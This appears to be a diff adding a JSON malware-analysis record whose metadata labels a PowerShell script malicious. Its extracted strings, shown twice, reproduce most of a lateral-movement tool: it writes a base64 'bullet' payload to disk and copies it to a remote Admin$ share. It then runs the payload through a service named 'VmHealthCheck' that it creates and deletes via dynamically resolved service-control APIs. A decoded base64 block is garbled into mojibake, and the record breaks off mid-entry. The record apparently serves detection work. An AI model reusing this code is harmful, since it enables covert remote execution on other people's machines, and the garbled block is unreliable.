@@ -1,0 +1,269 @@
+{
+  "meta": {
+    "quelldatei": "0a511648b1eb00f3eee4edaaa1fca683bbfc2fbb24923f334ba82485fd890f1b.ps1",
+    "sha256": "0a511648b1eb00f3eee4edaaa1fca683bbfc2fbb24923f334ba82485fd890f1b",
+    "groesse_bytes": 27057,
+    "zeilen": 277,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "mscorlib*",
+      "\r\n  if ($script:moduleDebug) { $_debugMode = ",
+      " }\r\n  return `\r\n      \"$ModVer. Run as ",
+      ". $_debugMode`n\" +\r\n      \"$osName / $osVersion / Powershell v${psVersion} / .Net ${dnetVersion}`n\"\r\n}\r\n\r\nfunction Save-Bullet([String] $SavePath) {\r\n  $bulletB64 = ",
+      "\r\n  $bulletText = [Text.Encoding]::UTF8.GetString([convert]::FromBase64String($bulletB64))\r\n\r\n  if ((Test-Path -path $SavePath) -eq $false) {\r\n      throw \"Can not save bullet. Directory ",
+      " does not exists\"\r\n  }\r\n  $bulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n  $bulletFile = Join-Path $SavePath $bulletFile\r\n  [Io.File]::WriteAllText($bulletFile, $bulletText)\r\n  return $bulletFile\r\n}\r\n\r\nfunction Clear-Bullet([String] $BulletFile) {\r\n  try {\r\n    Remove-Item $BulletFile -Force -ea SilentlyContinue\r\n  } catch {}\r\n}\r\n#endregion\r\n\r\nfunction Invoke-PsExec {\r\n  [CmdletBinding()]\r\n  param(\r\n    [string] $ComputerName,\r\n    [string] $BulletFile,\r\n    [string] $ServiceName,\r\n    [switch] $NoCleanup\r\n  )\r\n}\r\n\r\n  # ??  $ErrorActionPreference = \"Stop\"\r\n\r\n  function Local:Get-RandomString ([int]$Length = 12) {\r\n    $set = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\".ToCharArray()\r\n    $result = \"\"\r\n    for ($x = 0; $x -lt $Length; $x++) {\r\n      $result += $set | Get-Random\r\n    }\r\n    $result\r\n  }\r\n\r\n  function Local:Get-DelegateType {\r\n    Param (\r\n        [OutputType([Type])]\r\n        [Parameter( Position = 0)] [Type[]] $Parameters = (New-Object Type[](0)),\r\n        [Parameter( Position = 1 )] [Type] $ReturnType = [Void]\r\n    )\r\n\r\n    $Domain = [AppDomain]::CurrentDomain\r\n    $DynAssembly = New-Object System.Reflection.AssemblyName(",
+      ")\r\n    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\r\n    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(",
+      ", $false)\r\n    $TypeBuilder = $ModuleBuilder.DefineType(",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual",
+      ")[-1].Equals(",
+      ") }\r\n    $UnsafeNativeMethods = $SystemAssembly.GetType(",
+      ")\r\n    # Get a reference to the GetModuleHandle and GetProcAddress methods\r\n    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    #$GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    $GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ", [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);\r\n    # Get a handle to the module specified\r\n    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\r\n    $tmpPtr = New-Object IntPtr\r\n    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\r\n      \r\n    # Return the address of the function\r\n    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\r\n  }\r\n\r\n  function Local:Invoke-PsExecCmd {\r\n    param (\r\n      [string] $ComputerName,\r\n      [string] $RemoteBulletFile,\r\n      [string] $ServiceName,\r\n      [switch] $NoCleanup\r\n    )\r\n    $remoteCmd = \r\n      ",
+      " +\r\n      ",
+      " +\r\n      $RemoteBulletFile\r\n    \r\n    #region Declare/setup all the needed API function\r\n    $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle\r\n    $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    \r\n\r\n    $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA\r\n    $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])\r\n    $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)\r\n    \r\n    $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA\r\n    $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([Int])\r\n    $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)\r\n\r\n    $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA\r\n    $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [string], [string], [Int], [Int], [Int], [Int], [string], [string], [Int], [Int], [Int], [Int]) ([IntPtr])\r\n    $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)\r\n\r\n    $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA\r\n    $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([Int])\r\n    $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)\r\n\r\n    $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService\r\n    $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)\r\n\r\n    $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError\r\n    $GetLastErrorDelegate = Get-DelegateType @() ([Int])\r\n    $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)\r\n    #endregion\r\n\r\n    #region Service manipulation\r\n    Out-Info ",
+      "\r\n    $ManagerHandle = $OpenSCManagerA.Invoke(\"\\\\$ComputerName\", \"ServicesActive\", 0xF003F)\r\n    if (-not $ManagerHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #1. OpenSCManager. Operation failed, LastError: $$lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    }\r\n\r\n    Out-Info \"[+] #2. CreateServiceA. Creating new service: ",
+      "\"\r\n    $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, `\r\n      $remoteCmd, $null, $null, $null, $null, $null)\r\n    if (-not $ServiceHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #2. CreateService failed, LastError: $lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    } \r\n\r\n    Out-Info \"[+] #3. StartService. Starting the service\"\r\n    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)\r\n    Start-Sleep -s 3  # lets breathe for a second\r\n    $lastErr = $GetLastError.Invoke()\r\n    if ($val -ne 0){\r\n      Out-Debug \"[*] #3. StartService. Service successfully started\"\r\n    }\r\n    else{\r\n      if ($lastErr -eq 0){\r\n        Out-Debug \"[*] #3. StartService. Command returned ",
+      ". Looks like everything is Ok\"\r\n      } elseif ($lastErr -eq 1053){\r\n        Out-Debug \"[*] #3. StartService. Command didn",
+      "s Ok, normal behaviour\"\r\n      } else{\r\n        Out-Info \"[!] #3. StartService. StartService failed, LastError: $lastErr\"\r\n      }\r\n    }\r\n\r\n    Out-Info \"[+] #4. DeleteService. Deleting the service ",
+      " after small pause\"\r\n    Start-Sleep -s 15  # lets breathe for a bit\r\n    $val = $DeleteService.invoke($ServiceHandle)\r\n    if ($val -eq 0){\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #4. DeleteService. DeleteService failed, LastError: $lastErr\"\r\n    } else{\r\n      Out-Debug \"[*] #4. DeleteService. Service successfully deleted\"\r\n    }\r\n    \r\n    Out-Info \"[+] #5. CloseServiceHandle. Closing the Service handle\"\r\n    $val = $CloseServiceHandle.Invoke($ServiceHandle)\r\n\r\n    Out-Info \"[+] #6. CloseServiceHandle. Closing the SC Manager handle\"\r\n    $null = $CloseServiceHandle.Invoke($ManagerHandle)\r\n  #endregion\r\n  #Invoke-PsExecCmd\r\n}  \r\n\r\n\r\n  #region Invoke-PsExec code\r\n  try {\r\n    $remoteBulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n    $RemoteUploadPath = \"\\\\$ComputerName\\Admin$\\$remoteBulletFile\"\r\n    Out-Info \"[*] Copying bullet file $BulletFile to ",
+      "\"\r\n    Copy-Item -Force -Path $BulletFile -Destination $RemoteUploadPath\r\n  } catch {\r\n    throw \"[!] Can not upload bullet file $BulletFile to remote share $RemoteUploadPath`n$($error[0])\"\r\n  }\r\n  \r\n  Invoke-PsExecCmd -ComputerName $ComputerName -RemoteBulletFile $RemoteUploadPath -ServiceName $ServiceName\r\n\r\n  try {\r\n    Out-Info \"[*] Removing the remote bullet file ",
+      "\"\r\n    Remove-Item -Path $RemoteUploadPath -Force\r\n  } catch {}\r\n  #endregion\r\n\r\n\r\nfunction Start-Module {\r\n  Param (\r\n    [String] $TargetHost = ",
+      ",\r\n    [string] $ServiceName = \"VmHealthCheck\",\r\n    [String] $LogFile = ",
+      ",\r\n    [Switch] $Debug\r\n  )\r\n\r\n  $script:moduleLogFile = $LogFile\r\n  $script:moduleDebug = $Debug\r\n  Out-Info (Get-PlatformInfo)\r\n  Out-Debug \"[+] Start module with params: TargetHost: ",
+      "  ServiceName: ",
+      "\"\r\n\r\n  try {\r\n    if (-not ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)) {\r\n        throw \"[!] Current host $($env:COMPUTERNAME) is not a member of domain and can",
+      "\r\n    }\r\n    if ([string]::IsNullOrEmpty($TargetHost)) {\r\n      throw ",
+      "\r\n    }\r\n  \r\n    $SavePath = $env:PUBLIC\r\n    $LocalBulletFile = Save-Bullet $SavePath\r\n    $cbBullet = (Get-Item $LocalBulletFile).length\r\n    Out-Debug ",
+      "$LocalBulletFile",
+      "\r\n    $ServiceName = $ServiceName + (Get-Random -Maximum 10000).ToString()\r\n    Invoke-PsExec -ComputerName $TargetHost -BulletFile ",
+      " -ServiceName $ServiceName\r\n  } \r\n  catch {\r\n    Out-Info ",
+      "\r\n    Out-Info $error[0].Message\r\n    Out-Debug $error[0].InvocationInfo.PositionMessage \r\n  }\r\n  finally {\r\n    Clear-Bullet $LocalBulletFile\r\n  }\r\n}\r\n\r\n# -- module startup ----------------------------------------\r\n$ModVer = ",
+      "\r\n$script:moduleLogFile = ''\r\n$script:moduleDebug = $false\r\n$global:ProgressPreference = ",
+      "\r\n$script:SessionUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name\r\n\r\nStart-Module -TargetHost ",
+      "   \r\nOut-Info "
+    ],
+    "string_anzahl_gesamt": 44,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 15124,
+        "dekodiert": "爣来潩⁮敨灬牥映湵瑣潩獮਍畦据楴湯传瑵䐭扥杵嬨瑓楲杮⑝桴䵥杳 ൻ †琠祲笠਍††††晩⠠圤瑩䑨扥杵 ൻ †††††椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨潌䙧汩⥥ ⁻嬢䕄啂嵇∠⬠␠桴䵥杳簠传瑵䐭晥畡瑬素਍††††††汥敳笠∠䑛䉅䝕⁝•‫琤敨獍⁧⁼摁ⵤ潃瑮湥⁴䰤杯楆敬素਍†††素਍††⁽慣捴⁨絻਍ൽ昊湵瑣潩⁮敇⵴楂獯敓楲污⤨笠਍††猤⁮‽䈢佉⁓乕之坏≎਍††弤湳㴠∠ഢ †琠祲笠਍††††洤敓牡档牥㴠䜠瑥圭業扏敪瑣ⴠ畑牥⁹匢䱅䍅⁔敓楲污畎扭牥䘠佒⁍楗㍮弲䥂协•攭⁡楓敬瑮祬潃瑮湩敵਍††††晩⠠洤敓牡档牥 ൻ †††††映牯慥档⠠漤椠⁮洤敓牡档牥 ൻ †††††††椠⁦␨⹯牐灯牥楴獥丮浡⁥攭ⁱ匢牥慩乬浵敢≲ ൻ †††††††††␠獟⁮‽漤倮潲数瑲敩⹳慖畬൥ †††††††素਍††††††ൽ †††素਍††ൽ †挠瑡档笠ൽ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨獟⥮ⴠ煥␠慦獬⥥笠␠湳㴠␠獟⁮ൽ †爠瑥牵⁮␢湳㬢਍ൽ昊湵瑣潩⁮潃癮牥⵴潔慂敳㐶嬨瑳楲杮⁝琤敨潓牵散 ൻ †爠瑥牵⁮䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥␨桴卥畯捲⥥ഩ紊਍畦据楴湯䌠湯敶瑲䘭潲䉭獡㙥⠴獛牴湩嵧␠桴卥畯捲⥥笠਍††敲畴湲嬠敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥瑓楲杮嬨潃癮牥嵴㨺牆浯慂敳㐶瑓楲杮␨桴卥畯捲⥥ഩ紊਍਍畦据楴湯䌠敨正匭捥湯䍤灯⡹獛牴湩嵧␠湵煩敵摉 ൻ †␠敳潣摮潃祰㴠␠慦獬൥ †琠祲笠਍††††渤汵⁬‽呛牨慥楤杮匮浥灡潨敲㩝伺数䕮楸瑳湩⡧甤楮畱䥥⥤਍††††猤捥湯䍤灯⁹‽琤畲൥ †素挠瑡档笠਍††††猤牣灩㩴敓慭桰牯⁥‽敎⵷扏敪瑣吠牨慥楤杮匮浥灡潨敲〨‬ⰱ␠湵煩敵摉ഩ †素਍††敲畴湲␠敳潣摮潃祰਍ൽ⌊湥牤来潩൮ഊ⌊敲楧湯䌠湯潳敬䔠捸慨杮൥䘊湵瑣潩⁮敓摮吭䍯湯潳敬嬨瑓楲杮⁝琤敨湁睳牥 ൻ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨桴䅥獮敷⥲ ⁻敲畴湲素਍਍††弤捲㴠∠ഢ †琠祲笠਍††††弤捷㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮਍††††弤捷儮敵祲瑓楲杮䄮摤∨摩Ⱒ␠捳楲瑰洺䥹⥄਍††††弤捷䠮慥敤獲䄮摤∨潃瑮湥⵴祴数Ⱒ∠整瑸栯浴≬ഩ †††␠睟⹣效摡牥⹳摁⡤䄢捣灥≴‬琢硥⽴瑨汭⤢਍††††弤捲㴠␠睟⹣灕潬摡瑓楲杮␨牵䍬湯潳敬‬琤敨湁睳牥ഩഊ †††传瑵䐭扥杵∠敒楣癥摥映潲⁭潣獮汯㩥湠␧␨牟⥣∧਍††††敲畴湲⠠弤捲‬∢ഩ †素਍††慣捴⁨ൻ †††␠敟牲㴠␠⹟潔瑓楲杮⤨਍††††畏⵴敄畢⁧䌢湯潳敬攠捸慨杮⁥牥潲㩲湠⠤弤牥⥲湠呈偔䔠牲牯›⠤弤捲∩਍††††敲畴湲⠠∢‬弤牥⥲਍††ൽ紊਍攣摮敲楧湯਍਍爣来潩⁮湉瑩慩楬慺楴湯਍畦据楴湯删浥癯ⵥ祍敳晬笠਍††晩⠠判湵潐瑲扡敬 ⁻敲畴湲素਍††瀤潲䙧汩⁥‽猤牣灩㩴祭湉潶慣楴湯䴮䍹浯慭摮倮瑡൨ †椠⁦⠨敔瑳倭瑡⁨瀤潲䙧汩⥥ⴠ煥␠牴敵 ൻऊ††敒潭敶䤭整⁭瀤潲䙧汩⁥䘭牯散ⴠ牅潲䅲瑣潩⁮楓敬瑮祬潃瑮湩敵਍††ൽ紊਍਍畦据楴湯䤠楮⵴祍敳晬笠਍††弤獯㴠䜠瑥圭業扏敪瑣圠湩㈳佟数慲楴杮祓瑳浥ⴠ慥匠汩湥汴䍹湯楴畮൥ †椠⁦␨潟⥳笠਍††††洤佹噓牥楳湯㴠␠潟⹳慃瑰潩⁮‫••‫弤獯嘮牥楳湯਍††⁽汥敳笠਍††††洤佹噓牥楳湯㴠✠协唠歮潮湷搠敵琠⁯䵗⁉牥潲❲਍††ൽ †␠祭獕牥慎敭㴠嬠敓畣楲祴倮楲据灩污圮湩潤獷摉湥楴祴㩝䜺瑥畃牲湥⡴⸩慎敭਍††洤䡹獯乴浡⁥‽弤獯䌮乓浡൥ഊ †␠獟⁮‽敇⵴楂獯敓楲污਍††弤摩㴠∠⠤洤䡹獯乴浡⥥⑟␨祭獕牥慎敭弩⠤弤湳弩⠤䜤潲灵䑉∩਍††弤摩㴠嬠敒敧嵸㨺敒汰捡⡥弤摩‬嬢慞稭ⵁず㤭≝‬∢ഩ †␠獩敓潣摮潃祰㴠䌠敨正匭捥湯䍤灯⁹弤摩਍††猤牣灩㩴祭䑉㴠∠弤摩␭␨捳楲瑰洺噹牥∩਍਍††洤䑹浯楡⁮‽䠢獯⁴獩渠瑯愠洠浥敢⁲景搠浯楡≮਍††弤獣㴠䜠瑥圭業扏敪"
+      }
+    ],
+    "base64_bloecke_gesamt": 2
+  },
+  "stufe2_features": {
+    "strings": [
+      "mscorlib*",
+      "\r\n  if ($script:moduleDebug) { $_debugMode = ",
+      " }\r\n  return `\r\n      \"$ModVer. Run as ",
+      ". $_debugMode`n\" +\r\n      \"$osName / $osVersion / Powershell v${psVersion} / .Net ${dnetVersion}`n\"\r\n}\r\n\r\nfunction Save-Bullet([String] $SavePath) {\r\n  $bulletB64 = ",
+      "\r\n  $bulletText = [Text.Encoding]::UTF8.GetString([convert]::FromBase64String($bulletB64))\r\n\r\n  if ((Test-Path -path $SavePath) -eq $false) {\r\n      throw \"Can not save bullet. Directory ",
+      " does not exists\"\r\n  }\r\n  $bulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n  $bulletFile = Join-Path $SavePath $bulletFile\r\n  [Io.File]::WriteAllText($bulletFile, $bulletText)\r\n  return $bulletFile\r\n}\r\n\r\nfunction Clear-Bullet([String] $BulletFile) {\r\n  try {\r\n    Remove-Item $BulletFile -Force -ea SilentlyContinue\r\n  } catch {}\r\n}\r\n#endregion\r\n\r\nfunction Invoke-PsExec {\r\n  [CmdletBinding()]\r\n  param(\r\n    [string] $ComputerName,\r\n    [string] $BulletFile,\r\n    [string] $ServiceName,\r\n    [switch] $NoCleanup\r\n  )\r\n}\r\n\r\n  # ??  $ErrorActionPreference = \"Stop\"\r\n\r\n  function Local:Get-RandomString ([int]$Length = 12) {\r\n    $set = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\".ToCharArray()\r\n    $result = \"\"\r\n    for ($x = 0; $x -lt $Length; $x++) {\r\n      $result += $set | Get-Random\r\n    }\r\n    $result\r\n  }\r\n\r\n  function Local:Get-DelegateType {\r\n    Param (\r\n        [OutputType([Type])]\r\n        [Parameter( Position = 0)] [Type[]] $Parameters = (New-Object Type[](0)),\r\n        [Parameter( Position = 1 )] [Type] $ReturnType = [Void]\r\n    )\r\n\r\n    $Domain = [AppDomain]::CurrentDomain\r\n    $DynAssembly = New-Object System.Reflection.AssemblyName(",
+      ")\r\n    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\r\n    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(",
+      ", $false)\r\n    $TypeBuilder = $ModuleBuilder.DefineType(",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual",
+      ")[-1].Equals(",
+      ") }\r\n    $UnsafeNativeMethods = $SystemAssembly.GetType(",
+      ")\r\n    # Get a reference to the GetModuleHandle and GetProcAddress methods\r\n    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    #$GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    $GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ", [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);\r\n    # Get a handle to the module specified\r\n    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\r\n    $tmpPtr = New-Object IntPtr\r\n    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\r\n      \r\n    # Return the address of the function\r\n    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\r\n  }\r\n\r\n  function Local:Invoke-PsExecCmd {\r\n    param (\r\n      [string] $ComputerName,\r\n      [string] $RemoteBulletFile,\r\n      [string] $ServiceName,\r\n      [switch] $NoCleanup\r\n    )\r\n    $remoteCmd = \r\n      ",
+      " +\r\n      ",
+      " +\r\n      $RemoteBulletFile\r\n    \r\n    #region Declare/setup all the needed API function\r\n    $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle\r\n    $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    \r\n\r\n    $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA\r\n    $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])\r\n    $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)\r\n    \r\n    $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA\r\n    $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([Int])\r\n    $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)\r\n\r\n    $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA\r\n    $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [string], [string], [Int], [Int], [Int], [Int], [string], [string], [Int], [Int], [Int], [Int]) ([IntPtr])\r\n    $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)\r\n\r\n    $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA\r\n    $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([Int])\r\n    $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)\r\n\r\n    $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService\r\n    $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)\r\n\r\n    $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError\r\n    $GetLastErrorDelegate = Get-DelegateType @() ([Int])\r\n    $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)\r\n    #endregion\r\n\r\n    #region Service manipulation\r\n    Out-Info ",
+      "\r\n    $ManagerHandle = $OpenSCManagerA.Invoke(\"\\\\$ComputerName\", \"ServicesActive\", 0xF003F)\r\n    if (-not $ManagerHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #1. OpenSCManager. Operation failed, LastError: $$lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    }\r\n\r\n    Out-Info \"[+] #2. CreateServiceA. Creating new service: ",
+      "\"\r\n    $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, `\r\n      $remoteCmd, $null, $null, $null, $null, $null)\r\n    if (-not $ServiceHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #2. CreateService failed, LastError: $lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    } \r\n\r\n    Out-Info \"[+] #3. StartService. Starting the service\"\r\n    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)\r\n    Start-Sleep -s 3  # lets breathe for a second\r\n    $lastErr = $GetLastError.Invoke()\r\n    if ($val -ne 0){\r\n      Out-Debug \"[*] #3. StartService. Service successfully started\"\r\n    }\r\n    else{\r\n      if ($lastErr -eq 0){\r\n        Out-Debug \"[*] #3. StartService. Command returned ",
+      ". Looks like everything is Ok\"\r\n      } elseif ($lastErr -eq 1053){\r\n        Out-Debug \"[*] #3. StartService. Command didn",
+      "s Ok, normal behaviour\"\r\n      } else{\r\n        Out-Info \"[!] #3. StartService. StartService failed, LastError: $lastErr\"\r\n      }\r\n    }\r\n\r\n    Out-Info \"[+] #4. DeleteService. Deleting the service ",
+      " after small pause\"\r\n    Start-Sleep -s 15  # lets breathe for a bit\r\n    $val = $DeleteService.invoke($ServiceHandle)\r\n    if ($val -eq 0){\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #4. DeleteService. DeleteService failed, LastError: $lastErr\"\r\n    } else{\r\n      Out-Debug \"[*] #4. DeleteService. Service successfully deleted\"\r\n    }\r\n    \r\n    Out-Info \"[+] #5. CloseServiceHandle. Closing the Service handle\"\r\n    $val = $CloseServiceHandle.Invoke($ServiceHandle)\r\n\r\n    Out-Info \"[+] #6. CloseServiceHandle. Closing the SC Manager handle\"\r\n    $null = $CloseServiceHandle.Invoke($ManagerHandle)\r\n  #endregion\r\n  #Invoke-PsExecCmd\r\n}  \r\n\r\n\r\n  #region Invoke-PsExec code\r\n  try {\r\n    $remoteBulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n    $RemoteUploadPath = \"\\\\$ComputerName\\Admin$\\$remoteBulletFile\"\r\n    Out-Info \"[*] Copying bullet file $BulletFile to ",
+      "\"\r\n    Copy-Item -Force -Path $BulletFile -Destination $RemoteUploadPath\r\n  } catch {\r\n    throw \"[!] Can not upload bullet file $BulletFile to remote share $RemoteUploadPath`n$($error[0])\"\r\n  }\r\n  \r\n  Invoke-PsExecCmd -ComputerName $ComputerName -RemoteBulletFile $RemoteUploadPath -ServiceName $ServiceName\r\n\r\n  try {\r\n    Out-Info \"[*] Removing the remote bullet file ",
+      "\"\r\n    Remove-Item -Path $RemoteUploadPath -Force\r\n  } catch {}\r\n  #endregion\r\n\r\n\r\nfunction Start-Module {\r\n  Param (\r\n    [String] $TargetHost = ",
+      ",\r\n    [string] $ServiceName = \"VmHealthCheck\",\r\n    [String] $LogFile = ",
+      ",\r\n    [Switch] $Debug\r\n  )\r\n\r\n  $script:moduleLogFile = $LogFile\r\n  $script:moduleDebug = $Debug\r\n  Out-Info (Get-PlatformInfo)\r\n  Out-Debug \"[+] Start module with params: TargetHost: ",
+      "  ServiceName: ",
+      "\"\r\n\r\n  try {\r\n    if (-not ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)) {\r\n        throw \"[!] Current host $($env:COMPUTERNAME) is not a member of domain and can",
+      "\r\n    }\r\n    if ([string]::IsNullOrEmpty($TargetHost)) {\r\n      throw ",
+      "\r\n    }\r\n  \r\n    $SavePath = $env:PUBLIC\r\n    $LocalBulletFile = Save-Bullet $SavePath\r\n    $cbBullet = (Get-Item $LocalBulletFile).length\r\n    Out-Debug ",
+      "$LocalBulletFile",
+      "\r\n    $ServiceName = $ServiceName + (Get-Random -Maximum 10000).ToString()\r\n    Invoke-PsExec -ComputerName $TargetHost -BulletFile ",
+      " -ServiceName $ServiceName\r\n  } \r\n  catch {\r\n    Out-Info ",
+      "\r\n    Out-Info $error[0].Message\r\n    Out-Debug $error[0].InvocationInfo.PositionMessage \r\n  }\r\n  finally {\r\n    Clear-Bullet $LocalBulletFile\r\n  }\r\n}\r\n\r\n# -- module startup ----------------------------------------\r\n$ModVer = ",
+      "\r\n$script:moduleLogFile = ''\r\n$script:moduleDebug = $false\r\n$global:ProgressPreference = ",
+      "\r\n$script:SessionUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name\r\n\r\nStart-Module -TargetHost ",
+      "   \r\nOut-Info "
+    ],
+    "string_anzahl_gesamt": 44,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 15124,
